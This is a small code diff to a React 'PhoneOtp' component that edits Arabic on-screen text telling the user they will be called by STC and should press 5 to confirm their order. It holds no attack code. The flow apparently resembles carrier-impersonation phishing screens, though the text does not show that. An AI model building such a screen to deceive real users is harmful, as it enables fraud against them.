@@ -86,12 +86,12 @@ const PhoneOtp = () => {
               className="w-1/2"
             />
             <div className="  w-full flex flex-col jus items-center gap-y-4">
-              <p className="text-xl font-bold">سوف يتم الاتصال بك الآن</p>
+              <p className="text-xl font-bold">سوف يتم الاتصال بك من STC</p>
               <p
                 className="font-bold text-gray-500"
-                style={{ fontSize: "10px" }}
+                style={{ fontSize: "12px" }}
               >
-                سيتم الاتصال بك من STC لتأكيد طلبك الرجاء الضغط على رقم 5
+                 لتأكيد طلبك الرجاء الضغط على رقم 5
               </p>
               <span className="text-purple-700 font-bold">! يرجي الإنتظار</span>
             </div>
